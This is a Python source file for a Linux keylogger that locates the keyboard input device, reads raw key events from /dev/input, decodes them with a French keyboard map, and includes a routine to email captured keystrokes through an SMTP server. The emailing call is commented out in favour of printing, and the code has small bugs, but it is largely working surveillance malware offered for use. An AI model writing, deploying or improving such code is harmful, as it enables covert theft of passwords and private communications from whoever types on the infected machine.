#!/usr/bin/env python3
# -*-coding:Latin-1 -*

# Credit to dotweak for the tutorial I followed

import sys
import re
import struct
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib

# Defines an array of all possible values and the respective character

qwerty_map = {
    2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9",
    11: "0", 12: "-", 13: "=", 14: "[BACKSPACE]", 15: "[TAB]", 16: "a", 17: "z",
    18: "e", 19: "r", 20: "t", 21: "y", 22: "u", 23: "i", 24: "o", 25: "p", 26: "^",
    27: "$", 28: "\n", 29: "[CTRL]", 30: "q", 31: "s", 32: "d", 33: "f", 34: "g",
    35: "h", 36: "j", 37: "k", 38: "l", 39: "m", 40: "ù", 41: "*", 42: "[SHIFT]",
    43: "<", 44: "w", 45: "x", 46: "c", 47: "v", 48: "b", 49: "n", 50: ",",
    51: ";", 52: ":", 53: "!", 54: "[SHIFT]", 55: "FN", 56: "ALT", 57: " ", 58: "[CAPSLOCK]",
}

USE_TLS = None
SERVER = None
MAIL = None
BUF_SIZE = None
PASS = None
KEYBOARD = "qwerty"

# Sends an email with the captured data

def sendEmail(message):
    msg = MIMEMultipart()

    password = PASS
    msg['From'] = EMAIL
    msg['To'] = EMAIL
    msg['Subject'] = "Log clavier"

    msg.attach(MIMEText(message, 'plain'))

    server = smtplib.SMTP(SERVER)

    if USE_TLS is True:
        server.starttls()

    server.login(msg['From'], password)
    server.sendmail(msg['From'], msg['To'], msg.as_string())
    server.quit()

# Basically this piece of code has the function to open the file /proc/bus/input/devices, read it line by line and find simultaneously the lines of the Handlers (Where we find the event id) and the lines of the EV (Where we find the type of events). It will return a list which should look like : [eventX, type, eventX, type, eventX, type, eventX, type, …]

def main():
    with open("/proc/bus/input/devices") as f:
        lines = f.readlines()

        pattern = re.compile("Handlers|EV=")
        handlers = list(filter(pattern.search, lines))

        pattern = re.compile("EV=120013")
        for idx, elt in enumerate(handlers):
            if pattern.search(elt):
                line = handlers[idx - 1]
        pattern = re.compile("event[0-9]")
        infile_path = "/dev/input/" + pattern.search(line).group(0)

# This chunk of code should help us retrieve the needed info from the raw data

    FORMAT = 'llHHI'
    EVENT_SIZE = struct.calcsize(FORMAT)

    in_file = open(infile_path, "rb")

    event = in_file.read(EVENT_SIZE)
    typed = ""

    while event:
        (_, _, type, code, value) = struct.unpack(FORMAT, event)

        if code != 0 and type == 1 and value == 1:
            if code in qwerty_map:
                typed += qwerty_map[code]
        if len(typed) > BUF_SIZE:
            #sendEmail(typed)
            print(typed)

            typed = ""
        event = in_file.read(EVENT_SIZE)

    in_file.close()


def usage():
    print("Usage : ./keylogger [your email] [your password] [smtp server] [tls/notls] [buffer_size]") # noqa


def init_arg():
    if len(sys.argv) < 5:
        usage()
        exit()
    global EMAIL
    global SERVER
    global USE_TLS
    global BUF_SIZE
    global PASS
    EMAIL = sys.argv[1]
    PASS = sys.argv[2]
    SERVER = sys.argv[3]
    if sys.argv[4] is "tls":
        USE_TLS = True
    else:
        USE_TLS = False
    BUF_SIZE = int(sys.argv[5])


if __name__ == "__main__":
    init_arg()
    main()
